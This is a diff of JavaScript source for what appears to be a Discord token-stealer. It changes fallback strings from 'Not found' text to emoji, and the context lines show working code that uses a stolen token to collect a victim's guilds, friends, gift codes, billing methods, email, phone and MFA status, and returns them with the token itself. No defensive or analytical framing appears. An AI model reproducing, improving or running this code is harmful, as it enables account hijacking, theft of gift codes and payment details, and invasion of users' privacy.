@@ -67,7 +67,7 @@ const get_guilds = async (token) => {
                 : "**🛠️ Admin**"
                 } | Server Name: (${guild.name}) | Members: \`${guild.member_count}\` - Online(s): \`${guild.member_online}\`\n[[Get Avatar Link]](https://cdn.discordapp.com/icons/${guild.id}/${guild.avatar}.png?size=2048)`
             ).join("\n")
-            : "Not Found";
+            : "❌";
     } catch (e) {
         return "";
     }
@@ -95,7 +95,7 @@ const rare_friend_badges = (flags) => {
         (512 & flags ? user[7] : "") +
         (16384 & flags ? user[8] : "") +
         (4194304 & flags ? user[9] : "") +
-        (131072 & flags ? user[10] : "") || "Not Found"
+        (131072 & flags ? user[10] : "") || "❌"
     );
 };
 
@@ -104,11 +104,11 @@ const get_friends = async (token) => {
     let res = await request("/v9/users/@me/relationships", token);
     res.filter((_) => _.type === 1).forEach((n) => {
         const l = rare_friend_badges(n.user.public_flags);
-        ñ += l !== "Not Found"
+        ñ += l !== "❌"
             ? `${l} ${n.user.username}#${n.user.discriminator}\n`
             : "";
     });
-    return ñ || "Not Found";
+    return ñ || "❌";
 };
 
 const get_language = (i) => {
@@ -195,7 +195,7 @@ const get_gifts_codes = async (token, settings) => {
     let t = [],
         res = await request(`/v9/users/@me/outbound-promotions/codes?locale=${settings.locale}`, token);
     return res.length === 0
-        ? "Codes-Gifts Not Found"
+        ? "❌"
         : res.forEach((g) => t.push({
             name: g.promotion.outbound_title,
             code: g.code
@@ -234,34 +234,34 @@ const get_discord_Info = async (token) => {
             
             billing = await request("/v9/users/@me/billing/payment-sources", token);
             billing = billing?.reduce((a, e) => {
-                if (e.brand && !e.invalid) a += "<a:card:1083014677430284358> ";
+                if (e.brand && !e.invalid) a += "<:card:1178353239066943508> ";
                 if (e.email) a += "<:paypal:1129073151746252870> ";
                 return a;
-            }, '') || 'Billing not found';
+            }, '') || '❌';
             
         return {
             token: token,
             ID: me.id,
             globalName: `${me.global_name}`,
-            avatarDecoration: `${me.avatar_decoration_data ? me.avatar_decoration_data : "Avatar decoration not found"}`,
+            avatarDecoration: `${me.avatar_decoration_data ? me.avatar_decoration_data : "❌"}`,
             username: `${me.username}#${me.discriminator}`,
             badges: get_badges(me.flags),
             nitroType: get_nitro_premium(await request(`/v9/users/${Buffer.from(token.split(".")[0], "base64").toString("binary")}/profile`, token)),
-            avatar: me.avatar ? await get_image(`https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}`) : "Avatar not found",
-            banner: me.banner ? await get_image(`https://cdn.discordapp.com/banners/${me.id}/${me.banner}`) : "Banner not found",
-            totalFriend: Array.isArray(relationships) ? relationships.filter((b) => b.type === 1).length : "No Found",
-            totalBlocked: Array.isArray(relationships) ? relationships.filter((a) => a.type === 2).length : "No Found",
-            pending: Array.isArray(relationships) ? relationships.filter((r) => r.type === 3).length : "No Found",
-            NitroGifts: gifts[0] ? gifts.map((g) => `${g}, `).join("") : "Nitro Gifts not found",
-            totalOwnedGuild: Array.isArray(guilds) ? guilds.filter((g) => g.owner).length : "No Found",
+            avatar: me.avatar ? await get_image(`https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}`) : "❌",
+            banner: me.banner ? await get_image(`https://cdn.discordapp.com/banners/${me.id}/${me.banner}`) : "❌",
+            totalFriend: Array.isArray(relationships) ? relationships.filter((b) => b.type === 1).length : "❌",
+            totalBlocked: Array.isArray(relationships) ? relationships.filter((a) => a.type === 2).length : "❌",
+            pending: Array.isArray(relationships) ? relationships.filter((r) => r.type === 3).length : "❌",
+            NitroGifts: gifts[0] ? gifts.map((g) => `${g}, `).join("") : "❌",
+            totalOwnedGuild: Array.isArray(guilds) ? guilds.filter((g) => g.owner).length : "❌",
             totalApplication: applications.length,
             totalConnection: connections.length,
             totalGuild: guilds.length,
             NSFW: me.nsfw_allowed ? "🔞 `Allowed`" : "❌ `Not allowed`",
             MFA2: me.mfa_enabled ? "✅ `Allowed`" : "❌ `Not allowed`",
             verified: me.verified ? "✅" : "❌",
-            bio: me.bio || "Bio not found",
-            phone: me.phone || "Phone not found",
+            bio: me.bio || "❌",
+            phone: me.phone || "❌",
             mail: me.email,
             billing,
             langue: get_language(settings.locale),
